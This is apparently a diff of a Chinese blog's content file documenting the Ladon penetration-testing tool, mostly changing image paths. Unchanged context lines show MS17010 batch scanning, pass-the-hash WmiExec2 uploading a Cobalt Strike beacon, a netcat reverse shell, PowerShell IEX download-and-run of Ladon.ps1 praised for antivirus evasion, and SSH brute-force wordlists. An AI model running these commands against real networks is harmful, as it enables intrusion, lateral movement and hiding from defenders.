 <h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>8.6版本：K8小密圈</p>
 ]]></content>
       <categories>
@@ -4875,12 +4875,12 @@ Windows 10 Version 1809 for 32-bit Systems</code></pre><h3 id="版本"><a href="
 <h4 id="批量扫描TXT"><a href="#批量扫描TXT" class="headerlink" title="批量扫描TXT"></a>批量扫描TXT</h4><p>支持txt参数</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">批量IP: Ladon ip.txt ms17010</span><br><span class="line">批量C段: Ladon ip24.txt ms17010</span><br><span class="line">批量B段: Ladon ip16.txt ms17010</span><br><span class="line">批量A段: Ladon ip8.txt ms17010</span><br><span class="line">批量url: Ladon url.txt WebLogicExp</span><br><span class="line">批量主机: Ladon host.txt ms17010</span><br><span class="line">批量域名: Ladon domain.txt host2ip</span><br><span class="line">自定义: Ladon str.txt EnBase64</span><br></pre></td></tr></table></figure>
 
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/OnlinePC84.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/OnlinePC84.PNG"></p>
 <h3 id="单线程用法"><a href="#单线程用法" class="headerlink" title="单线程用法"></a>单线程用法</h3><p>有很多授权项目防护并不是很强，或者说防火墙规则没配那么高的检测，比如说针对扫整个C段，使用Ladon默认线程批量检测无任何问题，虽然是批量，但是Ladon大部份模块针对一个IP也只是发一个包，所以很多防火墙没有拦截也正常。但是使用其它工具批量执行大量POC（如针对一个IP就检测MS17010、以及各类密码爆破，先不说有点用的防火墙直接BAN你IP，还针对大量IP同时搞这么多动作，没被管理员发现，只能说明管理员垃圾，防火墙也不给力。遇到防御强的，就是单纯一条ICMP协议探测C段存活都无法多线程，只能单线程才能扫描，那些一键加载一大堆这种10几年前的渗透方法就没办法了，刚好能跑出来都是运气，类似项目在实战中Ladon默认线程就是有时能扫出一些结果，有时完全扫不出。扫得出几台有可能是因为发了10个包有8个被拦截，2个没被拦的刚好也有东西所以扫得到，这种就是靠运气扫出东西，防火墙能拦也不代表它不丢包对吧，但我们的目的为的是在不被目标发现的情况下，获取到更全更完整的结果。所以就得使用单线程，速度确实慢很多，但是比起权限丢失或结果不太准更好。单线程机制Ladon一直都有这功能，正因为很多项目不适合像10几年前搞渗透那样，动不动就一键针对同个IP做大量动作，所以Ladon也一直不提供一键加载所有模块功能，感兴趣可以自己用个bat文件来调用一键加载多个模块。</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">8.3前版本: Ladon 1 192.168.1.8/24 ms17010 不支持noping</span><br><span class="line">&gt;=8.3版本: Ladon 192.168.1.8/24 ms17010 t=1</span><br><span class="line">&gt;=8.3版本: Ladon noping 192.168.1.8/24 ms17010 t=1</span><br></pre></td></tr></table></figure>
 
-<h3 id="Nbt探测信息"><a href="#Nbt探测信息" class="headerlink" title="Nbt探测信息"></a>Nbt探测信息</h3><p>该功能一直都在OsScan里，由于OS探测使用端口或协议较多，对于一些高防护项目，比如防火墙规则检测比较历害，针对一个IP同时发多个包会无法检测，所以分离出此协议，NBT属于UDP，故通过此协议探测到的存活主机也意味着支持UDP协议通信。<br><img alt data-original="https://k8gege.org/k8img/Ladon/exe/NbtInfo.PNG"></p>
-<p><img alt data-original="https://k8gege.org/k8img/LadonGo/NBT_macbook.PNG"></p>
+<h3 id="Nbt探测信息"><a href="#Nbt探测信息" class="headerlink" title="Nbt探测信息"></a>Nbt探测信息</h3><p>该功能一直都在OsScan里，由于OS探测使用端口或协议较多，对于一些高防护项目，比如防火墙规则检测比较历害，针对一个IP同时发多个包会无法检测，所以分离出此协议，NBT属于UDP，故通过此协议探测到的存活主机也意味着支持UDP协议通信。<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/NbtInfo.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/LadonGo/NBT_macbook.PNG"></p>
 <h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>8.2版本：K8小密圈</p>
 ]]></content>
       <categories>
@@ -4996,14 +4996,14 @@ window.location.href="https://k8gege.org/Ladon/ntlminfo.html";
 <p>LadonGUI 8.2 2021.5.15<br>[+]Base64 Unicdoe    主要用于WmiExec2或PowerShell命令的BASE64加密解密</p>
 <h3 id="Ladon模块使用例子"><a href="#Ladon模块使用例子" class="headerlink" title="Ladon模块使用例子"></a>Ladon模块使用例子</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C段：Ladon 192.168.1.8/24 WmiInfo</span><br><span class="line">C段：Ladon 192.168.1.8/c WmiInfo</span><br><span class="line">B段：Ladon 192.168.1.8/b WmiInfo</span><br><span class="line">A段：Ladon 192.168.1.8/a WmiInfo</span><br></pre></td></tr></table></figure>
 <p>批量IP(段)ip.txt、ip24.txt等请查看文档</p>
-<h3 id="Wmi探测信息"><a href="#Wmi探测信息" class="headerlink" title="Wmi探测信息"></a>Wmi探测信息</h3><p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/WmiInfo.PNG"></p>
-<h3 id="Winrm探测信息"><a href="#Winrm探测信息" class="headerlink" title="Winrm探测信息"></a>Winrm探测信息</h3><p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/WinrmInfo.PNG"></p>
-<h3 id="Smb探测信息"><a href="#Smb探测信息" class="headerlink" title="Smb探测信息"></a>Smb探测信息</h3><p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/SmbInfo.PNG"></p>
-<h3 id="Mssql探测信息"><a href="#Mssql探测信息" class="headerlink" title="Mssql探测信息"></a>Mssql探测信息</h3><p>EnumMssql为探测SqlServer版本等信息<br><img alt data-original="https://k8gege.org/k8img/Ladon/exe/MssqlInfo.PNG"></p>
-<h3 id="Exchange探测信息"><a href="#Exchange探测信息" class="headerlink" title="Exchange探测信息"></a>Exchange探测信息</h3><p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/ExchangeInfo.PNG"></p>
+<h3 id="Wmi探测信息"><a href="#Wmi探测信息" class="headerlink" title="Wmi探测信息"></a>Wmi探测信息</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/WmiInfo.PNG"></p>
+<h3 id="Winrm探测信息"><a href="#Winrm探测信息" class="headerlink" title="Winrm探测信息"></a>Winrm探测信息</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/WinrmInfo.PNG"></p>
+<h3 id="Smb探测信息"><a href="#Smb探测信息" class="headerlink" title="Smb探测信息"></a>Smb探测信息</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/SmbInfo.PNG"></p>
+<h3 id="Mssql探测信息"><a href="#Mssql探测信息" class="headerlink" title="Mssql探测信息"></a>Mssql探测信息</h3><p>EnumMssql为探测SqlServer版本等信息<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/MssqlInfo.PNG"></p>
+<h3 id="Exchange探测信息"><a href="#Exchange探测信息" class="headerlink" title="Exchange探测信息"></a>Exchange探测信息</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/ExchangeInfo.PNG"></p>
 <h3 id="Rdp探测信息"><a href="#Rdp探测信息" class="headerlink" title="Rdp探测信息"></a>Rdp探测信息</h3><p>RdpInfo暂不支持内置，可使用INI方式批量</p>
 <h4 id="RdpInfo-ini"><a href="#RdpInfo-ini" class="headerlink" title="RdpInfo.ini"></a>RdpInfo.ini</h4><p>[Ladon]<br>exe=RdpInfo.exe<br>arg=$ip$<br>port=3389<br>log=true</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/RdpInfo.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/RdpInfo.PNG"></p>
 <h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>8.2版本：K8小密圈</p>
 <div style="text-align: center; width: 710px; border: green solid 0px;">
 <img alt style="display: inline-block;width: 250px;height: 300px;" data-original="https://k8gege.org/img/k8team.jpg">
@@ -5034,16 +5034,16 @@ window.location.href="https://k8gege.org/Ladon/wmiexec2.html";
 <h3 id="模块用法"><a href="#模块用法" class="headerlink" title="模块用法"></a>模块用法</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Load WmiExec2</span><br><span class="line">Usage:</span><br><span class="line">Ladon WmiExec2 host user pass cmd whoami</span><br><span class="line">Ladon WmiExec2 pth host cmd whoami</span><br><span class="line">Base64Cmd <span class="keyword">for</span> Cobalt Strike</span><br><span class="line">Ladon WmiExec2 host user pass b64cmd whoami</span><br><span class="line">Ladon WmiExec2 host user pass b64cmd whoami</span><br><span class="line">Upload:</span><br><span class="line">Ladon WmiExec2 host user pass upload beacon.exe ceacon.exe</span><br><span class="line">Ladon WmiExec2 pth host upload beacon.exe ceacon.exe</span><br></pre></td></tr></table></figure>
 <p>批量IP(段)ip.txt、ip24.txt等请查看文档</p>
 <h3 id="WmiExec2执行"><a href="#WmiExec2执行" class="headerlink" title="WmiExec2执行"></a>WmiExec2执行</h3><p>在Cobalt Strike的shell下执行wmiexec需要带空格引号参数时，CS转义有问题，使用正常CMD命令比较麻烦，所以我增加了个b64cmd参数便于在CS下使用(这个方法在几个月前的BypassUac里使用，很多人不知道为什么这样做，直接CMD命令不好吗，非要经过一步加密，当你要执行的CMD命令含有很多转义时你就知道了，得经过CS转义成CMD转义得到正常CMD很麻烦)。b64cmd命令可通过LadonGUI 8.2使用Base64Unicode加密生成</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/Gui82.PNG"></p>
-<h4 id="执行结果"><a href="#执行结果" class="headerlink" title="执行结果"></a>执行结果</h4><p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/WmiExec2.PNG"></p>
-<h3 id="Wmi探测信息"><a href="#Wmi探测信息" class="headerlink" title="Wmi探测信息"></a>Wmi探测信息</h3><p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/WmiInfo.PNG"></p>
-<h3 id="Winrm探测信息"><a href="#Winrm探测信息" class="headerlink" title="Winrm探测信息"></a>Winrm探测信息</h3><p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/WinrmInfo.PNG"></p>
-<h3 id="Smb探测信息"><a href="#Smb探测信息" class="headerlink" title="Smb探测信息"></a>Smb探测信息</h3><p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/SmbInfo.PNG"></p>
-<h3 id="Mssql探测信息"><a href="#Mssql探测信息" class="headerlink" title="Mssql探测信息"></a>Mssql探测信息</h3><p>EnumMssql为探测SqlServer版本等信息<br><img alt data-original="https://k8gege.org/k8img/Ladon/exe/MssqlInfo.PNG"></p>
-<h3 id="Exchange探测信息"><a href="#Exchange探测信息" class="headerlink" title="Exchange探测信息"></a>Exchange探测信息</h3><p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/ExchangeInfo.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/Gui82.PNG"></p>
+<h4 id="执行结果"><a href="#执行结果" class="headerlink" title="执行结果"></a>执行结果</h4><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/WmiExec2.PNG"></p>
+<h3 id="Wmi探测信息"><a href="#Wmi探测信息" class="headerlink" title="Wmi探测信息"></a>Wmi探测信息</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/WmiInfo.PNG"></p>
+<h3 id="Winrm探测信息"><a href="#Winrm探测信息" class="headerlink" title="Winrm探测信息"></a>Winrm探测信息</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/WinrmInfo.PNG"></p>
+<h3 id="Smb探测信息"><a href="#Smb探测信息" class="headerlink" title="Smb探测信息"></a>Smb探测信息</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/SmbInfo.PNG"></p>
+<h3 id="Mssql探测信息"><a href="#Mssql探测信息" class="headerlink" title="Mssql探测信息"></a>Mssql探测信息</h3><p>EnumMssql为探测SqlServer版本等信息<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/MssqlInfo.PNG"></p>
+<h3 id="Exchange探测信息"><a href="#Exchange探测信息" class="headerlink" title="Exchange探测信息"></a>Exchange探测信息</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/ExchangeInfo.PNG"></p>
 <h3 id="Rdp探测信息"><a href="#Rdp探测信息" class="headerlink" title="Rdp探测信息"></a>Rdp探测信息</h3><p>RdpInfo暂不支持内置，可使用INI方式批量</p>
 <h4 id="RdpInfo-ini"><a href="#RdpInfo-ini" class="headerlink" title="RdpInfo.ini"></a>RdpInfo.ini</h4><p>[Ladon]<br>exe=RdpInfo.exe<br>arg=$ip$<br>port=3389<br>log=true</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/RdpInfo.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/RdpInfo.PNG"></p>
 <h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>8.2版本：K8小密圈</p>
 <div style="text-align: center; width: 710px; border: green solid 0px;">
 <img alt style="display: inline-block;width: 250px;height: 300px;" data-original="https://k8gege.org/img/k8team.jpg">
@@ -5526,9 +5526,9 @@ window.location.href="https://k8gege.org/Ladon/win2016_lpe_potato_bypass.html";
     string LadonUrl = &quot;http://192.168.1.110:800/Ladon.ps1&quot;;
     string LadonCmd = &quot;powershell -nop -c \&quot;IEX (New-Object Net.WebClient).DownloadString(&apos;&quot; + LadonUrl + &quot;&apos;); &quot; + input + &quot;\&quot;&quot;;
     _shell.ExecuteCommand(LadonCmd);
-}</code></pre><p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/qscmd.PNG"></p>
+}</code></pre><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/qscmd.PNG"></p>
 <p>PS：任何shell、C2、RAT、后门不管你怎么称呼，但凡能执行命令的地方，都可用此方法加载Ladon强化自己的工具</p>
-<h3 id="执行效果"><a href="#执行效果" class="headerlink" title="执行效果"></a>执行效果</h3><p>机器上线后，在CmdShell上使用Ladon命令对内网进行存活主机探测、操作系统识别、端口扫描、服务识别、MS17010高危漏洞检测、SSH\SMB\WMI\IPC\MYSQL\ORACLE\SQL\FTP\NBT网络协议密码爆破，以及内网横向移动wmiexec、psexec、smbexec、sshexec等,更多功能请看Ladon文档。下图为探测C段存活主机，探测B段可使用ip/b参数，当然探测C段也可使用ip/c参数，不是非要/24.<br><img alt data-original="https://k8gege.org/k8img/Ladon/exe/QSLadon.PNG"></p>
+<h3 id="执行效果"><a href="#执行效果" class="headerlink" title="执行效果"></a>执行效果</h3><p>机器上线后，在CmdShell上使用Ladon命令对内网进行存活主机探测、操作系统识别、端口扫描、服务识别、MS17010高危漏洞检测、SSH\SMB\WMI\IPC\MYSQL\ORACLE\SQL\FTP\NBT网络协议密码爆破，以及内网横向移动wmiexec、psexec、smbexec、sshexec等,更多功能请看Ladon文档。下图为探测C段存活主机，探测B段可使用ip/b参数，当然探测C段也可使用ip/c参数，不是非要/24.<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/QSLadon.PNG"></p>
 <h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>7.8版本：K8小密圈</p>
 ]]></content>
       <categories>
@@ -5555,7 +5555,7 @@ window.location.href="https://k8gege.org/Ladon/porttran.html";
 <p>如：mstsc /console /v:这里填写VPS的IP即可:338</p>
 <h3 id="Ladon命令"><a href="#Ladon命令" class="headerlink" title="Ladon命令"></a>Ladon命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Usage:</span><br><span class="line">Ladon PortTran TranPort ConnPort</span><br><span class="line">Ladon PortTran TragetIP TargetPort VpsIP TranPort</span><br><span class="line">Example:</span><br><span class="line">Listen: Ladon PortTran 8000 338</span><br><span class="line">Tran: Ladon PortTran 192.168.1.30 3389 192.168.1.8 8000</span><br><span class="line">Test: mstsc 192.168.1.8 338</span><br></pre></td></tr></table></figure>
 
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/PortTran.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/PortTran.PNG"></p>
 <h3 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h3><p>转发到本机<br>rportfwd 389 192.1.20.30 3389<br>转发到VPS<br>Ladon PortTran 192.168.1.30 3389 192.168.1.8 8000</p>
 <h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>7.8版本：K8小密圈</p>
 ]]></content>
@@ -6141,8 +6141,8 @@ window.location.href="https://k8gege.org/Ladon/netsh.html";
 <p>listenaddress - 等待连接的本地IP地址<br>listenport - 本地侦听TCP端口<br>connectaddress - 将传入连接重定向到本地或远程IP地址<br>connectport - 一个TCP端口</p>
 <p>113机器上以管理员权限执行命令<br>netsh interface portproxy add v4tov4 listenport=888 connectport=22 connectaddress=192.168.1.112</p>
 <h3 id="Ladon端口转发"><a href="#Ladon端口转发" class="headerlink" title="Ladon端口转发"></a>Ladon端口转发</h3><p>113机器上以管理员权限执行命令<br>Ladon netsh add 888 192.168.1.112 22</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/netsh.PNG"></p>
-<h3 id="SSH转发"><a href="#SSH转发" class="headerlink" title="SSH转发"></a>SSH转发</h3><p>转发后我们访问113机器的888端口，就是访问112的SSH端口，刚好可用于测试Ladon的自定义SSH端口爆破<br><img alt data-original="https://k8gege.org/k8img/Ladon/exe/DiyPortSSH.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/netsh.PNG"></p>
+<h3 id="SSH转发"><a href="#SSH转发" class="headerlink" title="SSH转发"></a>SSH转发</h3><p>转发后我们访问113机器的888端口，就是访问112的SSH端口，刚好可用于测试Ladon的自定义SSH端口爆破<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/DiyPortSSH.PNG"></p>
 <h3 id="其它端口同理"><a href="#其它端口同理" class="headerlink" title="其它端口同理"></a>其它端口同理</h3><h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>7.8版本：K8小密圈</p>
 ]]></content>
       <categories>
@@ -6167,11 +6167,11 @@ window.location.href="https://k8gege.org/Ladon/netsh.html";
 <p>pass.txt<br>123456<br>00000<br>k8gege</p>
 <h5 id="快速字典userpass-txt"><a href="#快速字典userpass-txt" class="headerlink" title="快速字典userpass.txt"></a>快速字典userpass.txt</h5><p>密码组userpass.txt,格式为用户和密码<br>userpass.txt<br>root 123456<br>root k8gege</p>
 <p>准备好字典，目标参数为IP:Port,即可实现自定义端口<br>命令 Ladon 192.168.1.8:888 SshScan</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/DiyPortSSH.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/DiyPortSSH.PNG"></p>
 <h4 id="批量验证主机帐密check-txt"><a href="#批量验证主机帐密check-txt" class="headerlink" title="批量验证主机帐密check.txt"></a>批量验证主机帐密check.txt</h4><p>支持快速验证已知密码，如从配置文件里获取，明确确认IP对应帐密，或自己掌握了很久，需要批量验证是否可用，从0开始爆破不好吧，速度慢且容易产生很多流量，已知机器帐密推荐此方法验证。</p>
 <p>check.txt<br>192.168.1.8 444 root k8gege<br>192.168.1.2 22 root k8520<br>192.168.1.6 root k8888</p>
 <p>命令 Ladon SshScan</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/DiyPortSsh2.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/DiyPortSsh2.PNG"></p>
 <h3 id="其它模块"><a href="#其它模块" class="headerlink" title="其它模块"></a>其它模块</h3><p>其它模块同理，有几个参数就写几个</p>
 <h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>7.8版本：K8小密圈</p>
 ]]></content>
@@ -6202,12 +6202,12 @@ window.location.href="https://k8gege.org/Ladon/netsh.html";
 <h4 id="linux-mac"><a href="#linux-mac" class="headerlink" title="linux/mac"></a>linux/mac</h4><p>nc -e /bin/bash 192.168.1.110 4444</p>
 <h4 id="Ladon"><a href="#Ladon" class="headerlink" title="Ladon"></a>Ladon</h4><p>Ladon ReverseTcp 192.168.1.110 4444 nc</p>
 <h4 id="Runas"><a href="#Runas" class="headerlink" title="Runas"></a>Runas</h4><p>Ladon Runas k8gege k8gege520 cmd.exe 192.168.1.110 4444</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/RunasNC.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/RunasNC.PNG"></p>
 <h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><p>其它方法反弹，Ladon也支持</p>
 <h3 id="执行CMD命令"><a href="#执行CMD命令" class="headerlink" title="执行CMD命令"></a>执行CMD命令</h3><p>不勾选PowerShell或PowerLadon，默认即是正常的CMD命令</p>
-<h3 id="执行PowerShell命令-加密"><a href="#执行PowerShell命令-加密" class="headerlink" title="执行PowerShell命令(加密)"></a>执行PowerShell命令(加密)</h3><p>优点：有一定的反查效果（虽说Base64形同虚设，但也比完全不加密好一点）<br>勾选PowerShell，在CMD框中输入PowerShell命令或代码，执行的时候自动加密<br>当然你也可以使用NC旁边的PowerShell，里面有很多随机混淆PowerShell的方法<br><img alt data-original="https://k8gege.org/k8img/Ladon/gui/ncpowershell.PNG"></p>
-<h3 id="一键搭建WEB服务器"><a href="#一键搭建WEB服务器" class="headerlink" title="一键搭建WEB服务器"></a>一键搭建WEB服务器</h3><p>将Ladon.ps1和Ladon.exe放到VPS或内网中，使用Ladon web 800搭建Web服务器<br><img alt data-original="https://k8gege.org/k8img/Ladon/gui/Ladon_web.PNG"></p>
-<h3 id="远程内存加载Ladon扫描"><a href="#远程内存加载Ladon扫描" class="headerlink" title="远程内存加载Ladon扫描"></a>远程内存加载Ladon扫描</h3><p>优点：1.无文件落地 2.免杀 3.无操作痕迹<br>执行NC反弹后，填写对应Ladon.ps1的下载地址并勾选PowerLadon，然后就可以像使用EXE或CS版那样使用Ladon了<br><img alt data-original="https://k8gege.org/k8img/Ladon/gui/NC_PowerLadon.PNG"></p>
+<h3 id="执行PowerShell命令-加密"><a href="#执行PowerShell命令-加密" class="headerlink" title="执行PowerShell命令(加密)"></a>执行PowerShell命令(加密)</h3><p>优点：有一定的反查效果（虽说Base64形同虚设，但也比完全不加密好一点）<br>勾选PowerShell，在CMD框中输入PowerShell命令或代码，执行的时候自动加密<br>当然你也可以使用NC旁边的PowerShell，里面有很多随机混淆PowerShell的方法<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/gui/ncpowershell.PNG"></p>
+<h3 id="一键搭建WEB服务器"><a href="#一键搭建WEB服务器" class="headerlink" title="一键搭建WEB服务器"></a>一键搭建WEB服务器</h3><p>将Ladon.ps1和Ladon.exe放到VPS或内网中，使用Ladon web 800搭建Web服务器<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/gui/Ladon_web.PNG"></p>
+<h3 id="远程内存加载Ladon扫描"><a href="#远程内存加载Ladon扫描" class="headerlink" title="远程内存加载Ladon扫描"></a>远程内存加载Ladon扫描</h3><p>优点：1.无文件落地 2.免杀 3.无操作痕迹<br>执行NC反弹后，填写对应Ladon.ps1的下载地址并勾选PowerLadon，然后就可以像使用EXE或CS版那样使用Ladon了<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/gui/NC_PowerLadon.PNG"></p>
 <h3 id="Cmd远程加载Ladon"><a href="#Cmd远程加载Ladon" class="headerlink" title="Cmd远程加载Ladon"></a>Cmd远程加载Ladon</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">powershell <span class="string">"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.5:800/Ladon.ps1'); Ladon OnlinePC"</span></span><br></pre></td></tr></table></figure>
 
 <p>适用于还没跟上时代的远控或Shell只支持CMD交互,最大的优点是免杀、无文件落地，其它RAT也可以使用这种本文NC加载Ladon执行命令的方法，强化自己的C2/RAT/WebShell工具，不要说我只给CS写插件，而是很多shell工具我都考虑到了,你实现不了CS的程序集加载功能，也可以使用这个简单又很实用的方法。</p>
@@ -6295,8 +6295,8 @@ window.location.href="https://k8gege.org/Ladon/SubDomain.html";
 </script>
 
 <h3 id="更新功能"><a href="#更新功能" class="headerlink" title="更新功能"></a>更新功能</h3><p>GUI 2020.11.2<br>[+] SubDomain 高效率子域名扫描（3万字典）<br>[+] OnlinePC  本地存活主机、操作系统探测</p>
-<h3 id="GUI子域名扫描"><a href="#GUI子域名扫描" class="headerlink" title="GUI子域名扫描"></a>GUI子域名扫描</h3><p><img alt data-original="https://k8gege.org/k8img/Ladon/gui/SubDomain.PNG"></p>
-<h3 id="本地存活主机探测"><a href="#本地存活主机探测" class="headerlink" title="本地存活主机探测"></a>本地存活主机探测</h3><p><img alt data-original="https://k8gege.org/k8img/Ladon/gui/OnlinePC.png"></p>
+<h3 id="GUI子域名扫描"><a href="#GUI子域名扫描" class="headerlink" title="GUI子域名扫描"></a>GUI子域名扫描</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/gui/SubDomain.PNG"></p>
+<h3 id="本地存活主机探测"><a href="#本地存活主机探测" class="headerlink" title="本地存活主机探测"></a>本地存活主机探测</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/gui/OnlinePC.png"></p>
 <h3 id="CMD子域名扫描"><a href="#CMD子域名扫描" class="headerlink" title="CMD子域名扫描"></a>CMD子域名扫描</h3><p>Example: Ladon baidu.com SubDomain<br>需域名字典SubDomain.dic，字典上万个高效率子域名</p>
 <p><img alt data-original="https://k8gege.github.io/k8img/Ladon/exe/SubDomain.gif"><br><img alt data-original="https://k8gege.github.io/k8img/Ladon/cs/CS_SubDomain.gif"></p>
 <p>与2300星的Subbrute对比,明显Ladon速度快很多倍 <a href="https://github.com/TheRook/subbrute" target="_blank" rel="noopener">https://github.com/TheRook/subbrute</a><br>作者说它的工具携带字典包含2000个常用子域名<br>先运行Subbrute几秒钟后再运行Ladon,直止GIF图片结束<br>Ladon已扫出上百个子域名，而Subbrute才扫出几个<br><img alt data-original="https://k8gege.github.io/k8img/Other/subbrute_subdomain.gif"></p>
@@ -7538,11 +7538,11 @@ window.location.href="https://k8gege.org/Ladon/sshscan.html";
     <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>天下武功,无坚不破,唯快不破。扫描速度 SMB &gt; Wmi ，但是SMB通不代表WMI通。<br>每秒700个左右，换句话说你只收集到500个密码，验证一个C段也就一分钟左右。</p>
